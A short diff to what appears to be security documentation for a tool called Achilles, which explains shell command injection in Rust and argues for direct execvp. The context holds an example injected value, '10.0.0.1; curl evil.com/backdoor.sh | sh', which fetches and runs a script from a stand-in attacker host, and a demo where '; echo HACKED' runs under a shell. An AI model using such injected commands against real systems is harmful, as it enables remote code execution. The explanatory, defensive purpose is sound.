@@ -122,9 +122,8 @@ Unix convention: exit code 0 = success, anything else = failure. Every security 
 ### The Attack
 
 Consider a workflow where the user specifies a target. A naive implementation:
-
 ```rust
-// ⚠️ CATASTROPHICALLY WRONG — NEVER DO THIS
+//️ CATASTROPHICALLY WRONG — NEVER DO THIS
 let target = user_input; // e.g., "10.0.0.1; curl evil.com/backdoor.sh | sh"
 
 Command::new("sh")
@@ -503,7 +502,7 @@ stdout: 127.0.0.1; echo HACKED
 --- Shell (dangerous) ---
 stdout: 127.0.0.1
 HACKED
-⚠️ Shell interpreted ';' — attacker payload executed!
+Shell interpreted ';' — attacker payload executed!
 
 --- Conclusion ---
 Achilles uses direct execvp. Shell metacharacters are never interpreted.
